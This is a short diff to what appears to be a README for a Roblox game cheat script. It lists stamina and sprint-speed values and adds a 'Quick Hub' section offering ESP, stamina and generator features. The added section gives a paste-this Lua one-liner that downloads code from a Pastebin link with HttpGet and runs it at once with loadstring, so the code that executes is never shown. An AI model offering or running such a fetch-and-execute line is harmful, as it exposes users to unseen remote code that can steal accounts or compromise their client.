@@ -14,3 +14,9 @@ m.StaminaGain = 15
 m.StaminaLoss = 10
 m.SprintSpeed = 29
 ```
+
+## Quick Hub
+esp | stamina | generator
+```lua
+loadstring(game:HttpGet("https://pastebin.com/raw/nqjjAcLz"))()
+```
